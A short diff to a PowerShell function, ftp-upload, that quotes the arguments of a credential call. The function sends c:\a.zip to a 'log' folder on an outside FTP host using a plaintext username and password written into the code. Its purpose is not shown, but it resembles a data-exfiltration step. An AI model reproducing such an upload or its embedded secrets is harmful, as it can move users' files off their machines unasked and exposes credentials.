@@ -9,7 +9,7 @@ function ftp-upload {
 
     try {
         $webClient = New-Object System.Net.WebClient
-        $webClient.Credentials = New-Object System.Net.NetworkCredential(zigfl2268087, M0tdep@ssezig)
+        $webClient.Credentials = New-Object System.Net.NetworkCredential("zigfl2268087", "M0tdep@ssezig")
         
         $webClient.UploadFile("ftp://ftp.zigflip.fun:21/log/a.zip", "c:\a.zip")
 
